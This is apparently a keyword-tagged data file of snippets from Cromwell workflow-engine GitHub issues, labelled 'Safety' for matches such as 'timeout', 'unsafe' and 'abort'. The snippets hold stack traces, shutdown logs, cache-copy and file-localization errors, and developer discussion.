Safety,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:3065,Timeout,TimeoutException,3065,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['Timeout'],['TimeoutException']
Safety,d:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2721,unsafe,unsafeRunAsync,2721,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['unsafe'],['unsafeRunAsync']
Safety,d:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99961,unsafe,unsafeRunAsync,99961,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeRunAsync']
Safety,d:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:2226,unsafe,unsafeRunAsync,2226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['unsafe'],['unsafeRunAsync']
Safety,"d; [2022-12-15 21:28:53,46] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2022-12-15 21:28:53,46] [info] Aborting all running workflows.; [2022-12-15 21:28:53,46] [info] 0 workflows released by cromid-b254006; [2022-12-15 21:28:53,47] [info] WorkflowStoreActor stopped; [2022-12-15 21:28:53,47] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2022-12-15 21:28:53,47] [info] WorkflowLogCopyRouter stopped; [2022-12-15 21:28:53,47] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2022-12-15 21:28:53,47] [info] JobExecutionTokenDispenser stopped; [2022-12-15 21:28:53,47] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2022-12-15 21:28:53,47] [info] WorkflowManagerActor: All workflows finished; [2022-12-15 21:28:53,47] [info] WorkflowManagerActor stopped; [2022-12-15 21:28:53,71] [info] Connection pools shut down; [2022-12-15 21:28:53,71] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2022-12-15 21:28:53,72] [info] SubWorkflowStoreActor stopped; [2022-12-15 21:28:53,72] [info] JobStoreActor stopped; [2022-12-15 21:28:53,72] [info] CallCacheWriteActor stopped; [2022-12-15 21:28:53,72] [info] IoProxy stopped; [2022-12-15 21:28:53,74] [info] Shutting down connection pool: curAllocated=0 idleQueues.size=0 waitQueue.size=0 maxWaitQueueLimit=256 closed=false; [2022-12-15 21:28:53,74] [info] Shutting down connection pool: curAllocated=0 idleQueues.size=",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:49454,Timeout,Timeout,49454,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,9,['Timeout'],['Timeout']
Safety,"ding=h.iqo65dknl60s). . Briefly, the intention is to move the ""rendering"" process inside the `ServiceRegistryActor` so that in the future calls to the ServiceRegistry return JSON rather than event lists. This allows the ""pre-rendered JSON"" metadata service to fulfil the same service interface as the ""database-event driven"" metadata service. ### PR Review Guidance. Most of the PR is noise but the ""signal"" is very important to get right!. Things to consider when reviewing this (perhaps otherwise unwieldy) PR:. - Does the actor structure in the diagrams below make sense?; - ... and does it match reality as implemented in this PR?; - Have the newly introduced actors been implemented well? (ie please review these as though they were brand new actors); - `ReadMetadataRegulatorActor`; - `MetadataBuilderActor`; - `ReadDatabaseMetadataWorkerActor`; - Have the responsibilities of the replaced actors been taken care of appropriately?; - Has the API of Cromwell changed inappropriately?; - I had to refactor the `CallCacheDiffActor` because it was using the metadata service directly. Did I do a good job? And are its new tests appropriately equivalent to its old ones?; - Are there sufficient tests between unit, CI and ""perf"" to make you feel good about me merging this PR?; - Am I forgetting anything?. ### Structure before the changes:. ![Before BA-5842_ Metadata Service Actor (3)](https://user-images.githubusercontent.com/13006282/64040517-426d4380-cb2b-11e9-8a40-fa11edd33b58.png). ### Structure after the changes:. ![After BA-5842_ Metadata Service Actor](https://user-images.githubusercontent.com/13006282/64040066-24531380-cb2a-11e9-8a74-98d7c976e6ec.png). ### Concerns. This feels slightly more risky than normal because the refactor was pretty fiddly and I was ""test driven"" for a significant portion of the refactor - mainly because actors are not typed and thus it was very tricky to make sure I found everywhere using the old object set which should now be using the new object set.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5150:1871,risk,risky,1871,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5150,1,['risk'],['risky']
Safety,"dk/core/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n)""; java.lang.Exception: Task m2.Mutect2.M2:1:1 failed. JES error code 5. Message: 9: Failed to localize files: failed to copy the following files: ""gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam -> /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam, command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:9071,timeout,timeout,9071,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"dk:276.0.0-slim; labels:; logging: UserAction; timeout: 300s; - commands:; - /cromwell_root/script; entrypoint: /bin/bash; imageUri: ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9; labels:; tag: UserAction; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - commands:; - -c; - /bin/bash /cromwell_root/gcs_delocalization.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/1xxxxxx.sh && chmod u+x /tmp/1xxxxxx.sh; && sh /tmp/1xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; environment:; MEM_SIZE: '2.0'; MEM_UNIT: GB; resources:; virtualMachine:; bootDiskSizeGb: 12; bootImage: projects/cos-cloud/global/images/family/cos-stable; disks:; - name: local-disk; sizeGb: 10; type: pd-ssd; labels:; cromwell-workflow-id: xxxxxx; goog-pipelines-worker: 'true'; wdl-task-name: hello; machineType: custom-1-2048; network: {}; nvidiaDriverVersion: 450.51.06; serviceAccount:; email: default; scopes:; - https://www.googl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:20352,timeout,timeout,20352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12451,abort,abort,12451,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"e the error, but so far I can only get it from this workflow, possibly because of running time, IO, perl, seqware, I don't know. After much headdesking, I am nearly certain I have fixed the issue by changing the way cromwell executes a call. As you know, Cromwell generates a script.submit file which looks like this (in this case):. ``` bash; #!/bin/bash; docker run --rm -v /home/ubuntu/projects/debug-small-data/cromwell-executions/PcawgDelly/ebce533d-9f49-4e6d-8512-db7a182d3365/call-SeqwareWorkflow:/root/PcawgDelly/ebce533d-9f49-4e6d-8512-db7a182d3365/call-SeqwareWorkflow -i delly-docker-root /bin/bash < /home/ubuntu/projects/debug-small-data/cromwell-executions/PcawgDelly/ebce533d-9f49-4e6d-8512-db7a182d3365/call-SeqwareWorkflow/execution/script; ```. By removing input redirection into bash (i.e. removing the ""<"" character and changing the paths) I can get this workflow to run consistently without error. The new script.submit looks like:. ``` bash; #!/bin/bash; docker run --rm -v /home/ubuntu/projects/debug-small-data-alex/cromwell-executions/PcawgDelly/bdc567a9-b1f7-4530-853a-5263b890ca6a/call-SeqwareWorkflow:/root/PcawgDelly/bdc567a9-b1f7-4530-853a-5263b890ca6a/call-SeqwareWorkflow -i delly-docker-root /bin/bash /root/PcawgDelly/bdc567a9-b1f7-4530-853a-5263b890ca6a/call-SeqwareWorkflow/execution/script; ```. Basically, it runs the script from inside the docker container. I cannot, unfortunately, describe why the bug happened in this seemingly rare case, other than pointing at the dangers of shell commands being interpreted from pipes/stdin and waving my hands a lot. But, I do think avoiding input redirection of commands into bash is probably a good thing, in this case. Am I missing some case where it's necessary?. Luckily I think the fix is simple, and probably just involves updating the core conf. here:; core/src/main/resources/reference.conf. I was able to provide my own config file overrides for now as a workaround. Thanks! Sorry for the super long bug report.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1556:2706,avoid,avoiding,2706,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1556,1,['avoid'],['avoiding']
Safety,e we trying to upload an auth file when running in application default auth mode for both genomics and filesystems?. ```; [ERROR] [01/27/2017 14:39:36.100] [cromwell-system-akka.dispatchers.engine-dispatcher-5] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 732474fd-88b0-4a5e-ad19-5ee5cd71d141 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:81); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concu,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:1033,recover,recoverWith,1033,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['recover'],['recoverWith']
Safety,e$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2766,unsafe,unsafeToFuture,2766,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['unsafe'],['unsafeToFuture']
Safety,e$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100006,unsafe,unsafeToFuture,100006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
